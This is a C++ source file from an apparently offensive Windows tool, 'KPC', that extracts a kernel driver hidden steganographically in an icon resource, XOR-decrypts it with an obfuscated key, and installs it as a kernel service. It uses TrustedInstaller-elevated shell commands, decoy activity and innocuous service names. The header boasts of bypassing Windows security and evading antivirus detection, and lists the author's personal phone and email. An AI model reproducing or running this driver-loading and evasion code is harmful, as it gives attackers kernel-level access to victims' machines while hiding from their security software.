/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include "resource.h"
#include <filesystem>

namespace fs = std::filesystem;

// ======================= Driver Service Management =======================

bool Controller::StopDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return true; // Not an error if SCM unavailable
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true; // Service doesn't exist - already clean
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_STOPPED) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true; // Already stopped
        }
    }

    SERVICE_STATUS stopStatus;
    BOOL success = g_pControlService(hService, SERVICE_CONTROL_STOP, &stopStatus);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return success || err == ERROR_SERVICE_NOT_ACTIVE;
}

// ======================= Driver Resource Management =======================

std::vector<BYTE> Controller::ExtractEncryptedDriver() noexcept {
    auto icoData = Utils::ReadResource(IDR_MAINICON, RT_RCDATA);
    if (icoData.size() <= 9662) {
        ERROR(OBFERR(L"Icon resource too small or corrupted - steganographic driver missing").c_str());
        return {};
    }
    // Extract embedded driver data from icon resource (steganography)
    return std::vector<BYTE>(icoData.begin() + 9662, icoData.end());
}

std::vector<BYTE> Controller::DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept {
    if (encryptedData.empty()) {
        ERROR(OBFERR(L"No encrypted driver data provided").c_str());
        return {};
    }

    // Obfuscated decryption key to avoid static analysis
    auto decryptionKey = OBFSTR("[REDACTED]");
    std::vector<BYTE> decryptedData = encryptedData;
    
    for (size_t i = 0; i < decryptedData.size(); ++i) {
        decryptedData[i] ^= decryptionKey[i % decryptionKey.size()];
    }
    
    return decryptedData;
}

bool Controller::InstallDriverSilently() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) return false;
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) return false;

    // Create temp directory using modern filesystem API
    fs::path tempDir = fs::temp_directory_path();
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    
    if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) return false;

    // Fix: Declare driverDir and driverPath with proper scoping
    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());

    // Create directory using modern API with TrustedInstaller privileges
    auto mkdirCommand = OBFPATH(L"cmd.exe /c md \"");
    if (!RunAsTrustedInstallerSilent(mkdirCommand + driverDir.wstring() + OBFPATH(L"\""))) {
        // Fallback - try creating directory directly with elevated privileges
        std::error_code ec;
        fs::create_directories(driverDir, ec);
        if (ec) {
            DeleteFileW(tempDriverPath.c_str());
            return false;
        }
    }

    // Copy file using TrustedInstaller privileges
    auto copyCmd = OBFPATH(L"cmd.exe /c copy /Y \"");
    std::wstring copyCommand = copyCmd + tempDriverPath.wstring() + OBFPATH(L"\" \"") + driverPath.wstring() + OBFPATH(L"\"");
    if (!RunAsTrustedInstallerSilent(copyCommand)) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    // Verify file was copied
    if (!fs::exists(driverPath)) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    DeleteFileW(tempDriverPath.c_str());
    return RegisterDriverServiceSilent(driverPath.wstring());
}

bool Controller::RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    auto serviceDisplayName = OBFSVC(L"Helper Service");
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), serviceDisplayName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    bool success = (hService != nullptr) || (GetLastError() == ERROR_SERVICE_EXISTS);
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

bool Controller::StartDriverServiceSilent() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status;
    bool success = true;
    
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState != SERVICE_RUNNING) {
            success = g_pStartServiceW(hService, 0, nullptr) || (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

// ======================= Legacy Driver Management (Compatibility) =======================

bool Controller::InstallDriver() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) {
        ERROR(OBFERR(L"Failed to extract encrypted driver from icon resource").c_str());
        return false;
    }
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) {
        ERROR(OBFERR(L"Failed to decrypt embedded driver data").c_str());
        return false;
    }

    fs::path tempDir = fs::temp_directory_path();
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    
    if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) {
        ERROR(OBFERR(L"Failed to write driver file to temp location: %s").c_str(), tempDriverPath.c_str());
        return false;
    }

    // Fix: Declare driverDir and driverPath with proper scoping
    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());

    // Create directory using modern approach
    std::error_code ec;
    fs::create_directories(driverDir, ec);
    if (ec) {
        INFO(OBFINFO(L"Directory creation failed (may already exist)").c_str());
    }

    // Copy file using modern filesystem API with TrustedInstaller
    auto copyCmd = OBFPATH(L"cmd.exe /c copy /Y ");
    std::wstring copyCommand = copyCmd + tempDriverPath.wstring() + OBFPATH(L" ") + driverPath.wstring();
    INFO(OBFINFO(L"Copying driver with elevated privileges: %s").c_str(), copyCommand.c_str());

    if (!RunAsTrustedInstaller(copyCommand)) {
        ERROR(OBFERR(L"Failed to copy driver to system directory with elevated privileges").c_str());
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    if (!fs::exists(driverPath)) {
        ERROR(OBFERR(L"Driver file was not copied successfully to: %s").c_str(), driverPath.c_str());
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Driver file successfully copied to: %s").c_str(), driverPath.c_str());
    DeleteFileW(tempDriverPath.c_str());

    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(OBFERR(L"Failed to open service control manager: %d").c_str(), GetLastError());
        return false;
    }

    auto serviceDisplayName = OBFSVC(L"Memory Access Driver");
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), serviceDisplayName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (err != ERROR_SERVICE_EXISTS) {
            ERROR(OBFERR(L"Failed to create driver service: %d").c_str(), err);
            return false;
        }
        
        INFO(OBFINFO(L"Driver service already exists, proceeding").c_str());
    } else {
        CloseServiceHandle(hService);
        SUCCESS(OBFSUCCESS(L"Driver service created successfully").c_str());
    }

    CloseServiceHandle(hSCM);
    SUCCESS(OBFSUCCESS(L"Driver installed and registered as Windows service").c_str());
    return true;
}

bool Controller::UninstallDriver() noexcept {
    StopDriverService();

    if (!InitDynamicAPIs()) return true;

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return true; // Not an error if SCM unavailable
    }

    std::wstring serviceName = GetServiceName();
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true; // Service doesn't exist, already clean
    }

    BOOL success = g_pDeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            ERROR(OBFERR(L"Failed to delete driver service: %d").c_str(), err);
            return false;
        }
    }

    // Remove driver file using modern filesystem API
    // Fix: Declare driverPath with proper scoping
    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());
    
    std::error_code ec;
    if (!fs::remove(driverPath, ec)) {
        if (ec.value() != ERROR_FILE_NOT_FOUND) {
            // Try with elevated privileges if regular delete fails
            auto delCmd = OBFPATH(L"cmd.exe /c del /Q \"");
            std::wstring delCommand = delCmd + driverPath.wstring() + OBFPATH(L"\"");
            RunAsTrustedInstallerSilent(delCommand);
        }
    }

    return true;
}

bool Controller::StartDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(OBFERR(L"Failed to open service control manager: %d").c_str(), GetLastError());
        return false;
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        ERROR(OBFERR(L"Failed to open kernel driver service: %d").c_str(), GetLastError());
        return false;
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            INFO(OBFINFO(L"Kernel driver service already running").c_str());
            return true;
        }
    }

    BOOL success = g_pStartServiceW(hService, 0, nullptr);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success && err != ERROR_SERVICE_ALREADY_RUNNING) {
        ERROR(OBFERR(L"Failed to start kernel driver service: %d").c_str(), err);
        return false;
    }

    SUCCESS(OBFSUCCESS(L"Kernel driver service started successfully").c_str());
    return true;
}